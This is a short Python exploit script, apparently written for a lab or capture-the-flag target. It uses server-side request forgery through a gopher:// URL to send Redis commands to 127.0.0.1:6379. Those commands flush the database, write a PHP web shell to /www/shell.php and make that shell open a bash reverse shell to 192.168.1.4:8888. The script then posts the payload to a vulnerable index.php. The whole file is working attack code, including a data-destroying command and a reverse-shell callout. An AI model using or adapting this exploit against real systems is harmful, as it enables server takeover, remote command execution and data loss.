import urllib.parse
import requests


php_payload = """<?php exec("bash -c 'bash -i >& /dev/tcp/192.168.1.4/8888 2>&1'"); ?>"""

web_root_location = "/www"
payload = """*1\r
$8\r
flushall\r
*3\r
$3\r
set\r
$1\r
1\r
$""" + str(len(php_payload) + 4) + """\r


""" + php_payload + """

\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$""" + str(len(web_root_location)) + """\r
""" + web_root_location + """\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*1\r
$4\r
save\r

"""
finalpayload = urllib.parse.quote("gopher://127.0.0.1:6379/_" + payload, safe='').replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")


print(requests.post('http://localhost:5000/index.php', data={'url':finalpayload}).text)


